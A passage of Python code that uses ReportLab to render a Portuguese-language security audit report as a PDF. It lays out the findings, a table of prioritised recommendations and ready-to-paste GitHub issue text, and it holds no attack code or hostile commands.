            Spacer(1, 0.15 * cm),
            Paragraph("<b>Descrição:</b> " + f["descricao"], styles["body"]),
            Spacer(1, 0.15 * cm),
            Paragraph("<b>Evidência:</b>", styles["label"]),
            Paragraph(escape_code(f["evidencia"]), styles["code"]),
            Paragraph("<b>Cenário de exploração:</b> " + f["exploracao"], styles["body"]),
            Spacer(1, 0.1 * cm),
            Paragraph("<b>Correção sugerida:</b> " + f["correcao"], styles["body"]),
            Spacer(1, 0.5 * cm),
            HRFlowable(width="100%", color=colors.HexColor("#E5E7EB")),
            Spacer(1, 0.3 * cm),
        ]
        story.append(KeepTogether(block[:6]))
        story.extend(block[6:])

    story.append(PageBreak())

    # ── Recomendações priorizadas ─────────────────────────────────────
    story.append(Paragraph("Recomendações priorizadas", styles["h1"]))
    rec_rows = [[Paragraph("<b>Prioridade</b>", styles["small"]), Paragraph("<b>Ação</b>", styles["small"])]]
    for p, txt in RECOMMENDATIONS:
        rec_rows.append([Paragraph(f"<b>{p}</b>", styles["small"]), Paragraph(txt, styles["small"])])
    rec = Table(rec_rows, colWidths=[2.4 * cm, 14.1 * cm], repeatRows=1)
    rec.setStyle(TableStyle([
        ("BACKGROUND", (0, 0), (-1, 0), colors.HexColor("#111827")),
        ("TEXTCOLOR", (0, 0), (-1, 0), colors.white),
        ("VALIGN", (0, 0), (-1, -1), "TOP"),
        ("GRID", (0, 0), (-1, -1), 0.5, colors.HexColor("#E5E7EB")),
        ("ROWBACKGROUNDS", (0, 1), (-1, -1), [colors.white, colors.HexColor("#F9FAFB")]),
        ("TOPPADDING", (0, 0), (-1, -1), 6),
        ("BOTTOMPADDING", (0, 0), (-1, -1), 6),
        ("LEFTPADDING", (0, 0), (-1, -1), 6),
    ]))
    story.append(rec)
    story.append(PageBreak())

    # ── Issues para o GitHub ──────────────────────────────────────────
    story.append(Paragraph("Issues para o GitHub", styles["h1"]))
    story.append(Paragraph(
        "Texto completo em Markdown, pronto para copiar e colar na criação de cada issue.",
        styles["small"]))
    story.append(Spacer(1, 0.3 * cm))
    for i, issue in enumerate(GITHUB_ISSUES, 1):
        full_md = (
            f"# {issue['titulo']}\n\n"
            f"**Labels:** {issue['labels']}\n\n"
            f"{issue['corpo']}"
        )
        marker_open = f"--- ISSUE {i} ---"
        marker_close = f"--- FIM ISSUE {i} ---"
        story.append(Paragraph(f"<b>{marker_open}</b>", styles["label"]))
        code_text = full_md.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace("\n", "<br/>").replace(" ", "&nbsp;")
        story.append(Paragraph(code_text, styles["code"]))
        story.append(Paragraph(f"<b>{marker_close}</b>", styles["label"]))
        story.append(Spacer(1, 0.4 * cm))

    doc.build(story, onFirstPage=header_footer, onLaterPages=header_footer)
    print(f"PDF gerado em: {OUT_PDF}")


if __name__ == "__main__":
    build_pdf()
    for f in (CHART_DONUT, CHART_BAR):
        if os.path.exists(f):
            os.remove(f)
